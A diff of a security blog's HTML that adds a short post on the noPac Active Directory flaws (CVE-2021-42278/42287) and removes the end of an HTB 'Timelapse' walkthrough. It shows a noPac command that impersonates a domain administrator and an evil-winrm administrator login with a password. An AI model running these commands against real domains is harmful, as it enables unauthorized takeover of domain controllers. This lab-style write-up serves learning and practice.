+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220911111232.png">&#x2F;Pasted image 20220911111232.png)</p>
+<h2 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python noPac.py merak.local/zs:<span class="token string">'Password123'</span> -dc-ip DC.merak.local -shell --impersonate administrator </code></pre>
 
-<p>Now, login as administrator!</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
-└─$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -u administrator -p <span class="token string">')Vls1+OD0%8WlDdJ6Q)G!4)-'</span>                                                                       <span class="token number">130</span> ⨯
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
-
-Data: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
-
-Warning: SSL enabled
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
-timelapse<span class="token punctuation">\</span>administrator</code></pre>
-
-<p>Get root.txt in <code>c:\users\TRX\desktop\root.txt</code></p>
+<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910230856.png">&#x2F;Pasted image 20220910230856.png)</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1380">https://tttang.com/archive/1380</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10666">https://xz.aliyun.com/t/10666</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a></p>
 
                 
             </div>
@@ -600,7 +495,7 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Zh0um1.github.io/posts/628d110">http://Zh0um1.github.io/posts/628d110</a>
+                    <a href="http://Zh0um1.github.io/posts/0">http://Zh0um1.github.io/posts/0</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -637,11 +532,7 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/HTB/">
-                                    <span class="chip bg-color">HTB</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -687,9 +578,10 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/posts/0">
                     <div class="card-image">
@@ -707,9 +599,9 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -722,6 +614,7 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -732,13 +625,13 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/cfde7db2">
+                <a href="/posts/628d110">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Windwos 命令备忘录">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Timelapse">
                         
-                        <span class="card-title">Windwos 命令备忘录</span>
+                        <span class="card-title">Timelapse</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -749,7 +642,7 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-08
                             </span>
                         <span class="publish-author">
                             
@@ -762,8 +655,8 @@ timelapse<span class="token punctuation">\</span>administrator</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows/">
-                        <span class="chip bg-color">Windows</span>
+                    <a href="/tags/HTB/">
+                        <span class="chip bg-color">HTB</span>
                     </a>
                     
                 </div>
